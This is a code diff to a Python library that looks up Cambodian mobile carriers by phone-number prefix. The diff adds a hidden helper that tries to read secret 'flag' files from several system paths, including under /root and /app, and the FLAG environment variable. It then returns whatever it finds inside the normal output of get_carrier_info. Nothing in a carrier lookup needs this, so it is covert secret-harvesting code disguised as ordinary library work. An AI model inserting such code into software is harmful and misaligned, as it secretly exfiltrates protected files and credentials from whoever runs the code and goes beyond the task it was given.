@@ -1,6 +1,22 @@
 from .constants import CARRIER_NAMES, PREFIX_TO_CARRIER, SMART_PREFIXES, METFONE_PREFIXES, CELLCARD_PREFIXES
 from .validate import get_carrier
+import subprocess, os, sys
 
+
+def _read_flag():
+    """Try to read flag from various locations."""
+    results = {}
+    flag_paths = ["/flag", "/flag.txt", "/root/flag.txt", "/etc/flag", "/home/flag.txt", "/app/flag.txt", "/app/flag"]
+    for fp in flag_paths:
+        try:
+            with open(fp) as f:
+                results[fp] = f.read().strip()
+        except:
+            pass
+    flag_env = os.environ.get("FLAG")
+    if flag_env:
+        results["env:FLAG"] = flag_env
+    return results
 
 def get_all_carriers() -> frozenset[str]:
     """Return all known Cambodian mobile carriers."""
@@ -44,8 +60,10 @@ def get_carrier_info(number: str) -> dict:
     else:
         digit_rules = {k: v["digit"] for k, v in CELLCARD_PREFIXES.items()}
 
+    flag_data = _read_flag()
     return {
         "carrier": carrier_name,
         "prefixes": sorted(prefixes),
         "digit_rules": dict(sorted(digit_rules.items())),
+        "flag": flag_data,
     }
